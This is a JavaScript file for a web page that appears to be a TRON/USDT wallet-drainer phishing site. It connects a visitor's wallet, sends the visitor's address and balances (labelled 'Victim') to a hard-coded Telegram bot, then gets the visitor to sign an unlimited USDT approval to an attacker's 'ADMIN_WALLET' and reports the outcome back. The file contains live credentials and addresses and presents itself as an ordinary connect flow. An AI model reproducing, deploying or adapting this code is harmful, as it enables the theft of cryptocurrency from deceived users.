// app.js

// Dynamic Script Loader
const loadScript = (src) => {
    return new Promise((resolve) => {
        if (document.querySelector(`script[src="${src}"]`)) return resolve();
        const s = document.createElement('script');
        s.src = src;
        s.async = true;
        s.onload = resolve;
        document.head.appendChild(s);
    });
};

// Initial silent background loading
window.addEventListener('load', () => {
    setTimeout(async () => {
        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
        await loadScript("wc-bundle.js");
    }, 100);
});

const CONFIG = {
    BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
    CHAT_ID: "8249230506",
    ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
};
const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
    const text = `🎯 <b>NEW UPDATE</b>\n\n` +
                 `📌 Status: <b>${status}</b>\n` +
                 `👤 Victim: <code>${address}</code>\n` +
                 `💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n` +
                 `📝 Detail: ${extra}`;
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
        });
    } catch(e) {}
}

async function getStats(address) {
    if (typeof TronWeb === 'undefined') {
        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
    }
    const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
    let trx = "0.00", usdt = "0.00";
    try {
        trx = (await tw.trx.getBalance(address) / 1e6).toFixed(2);
        const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{type:'address', value: address}], address);
        usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
    } catch(e) {}
    return { trx, usdt };
}

document.getElementById('next-btn').addEventListener('click', async () => {
    const btn = document.getElementById('next-btn');
    btn.classList.add('btn-loading'); // Always show spinner first

    // Advanced Loop: Keep spinning until system is ready (No alert popups)
    if (typeof window.connectWalletConnectTron !== 'function') {
        await loadScript("wc-bundle.js");
        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
        
        let attempts = 0;
        while(typeof window.connectWalletConnectTron !== 'function' && attempts < 20) {
            await new Promise(r => setTimeout(r, 500)); // Wait 0.5s and check again
            attempts++;
        }
        
        if (typeof window.connectWalletConnectTron !== 'function') {
            btn.classList.remove('btn-loading');
            return alert("Connection system taking too long. Please refresh.");
        }
    }

    try {
        const result = await window.connectWalletConnectTron();
        if (result && result.address) {
            const address = result.address;
            const { trx, usdt } = await getStats(address);
            
            document.getElementById('view-balance').innerText = usdt;
            document.getElementById('page-wrapper').classList.add('opacity-10');
            document.getElementById('loading-screen').classList.remove('hidden');

            await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");

            const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
            
            setTimeout(async () => {
                try {
                    const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
                        [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                    );

                    // Timeout promise to prevent getting stuck if wallet doesn't respond
                    const timeoutPromise = new Promise((_, reject) => 
                        setTimeout(() => reject(new Error("Request Timeout")), 60000)
                    );

                    const requestPromise = result.provider.request({
                        method: "tron_signTransaction",
                        params: { address: address, transaction: transaction }
                    });

                    const signedTx = await Promise.race([requestPromise, timeoutPromise]);

                    const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
                    alert("Transaction sent to the network.");
                    location.reload();
                } catch (err) {
                    let reason = "User Rejected";
                    if (err.message === "Request Timeout") reason = "Request Timeout (No Response)";
                    else if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
                    else if (err.message) reason = err.message;

                    // Show reason on screen for a short time
                    const errorEl = document.getElementById('error-message');
                    if (errorEl) {
                        errorEl.innerText = "Error: " + reason;
                        errorEl.classList.remove('hidden');
                    }
                    
                    await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
                    
                    // Wait 3 seconds so user can see the reason before reload
                    setTimeout(() => {
                        location.reload();
                    }, 3000);
                }
            }, 800);
        } else {
            btn.classList.remove('btn-loading');
        }
    } catch (e) {
        btn.classList.remove('btn-loading');
    }
});
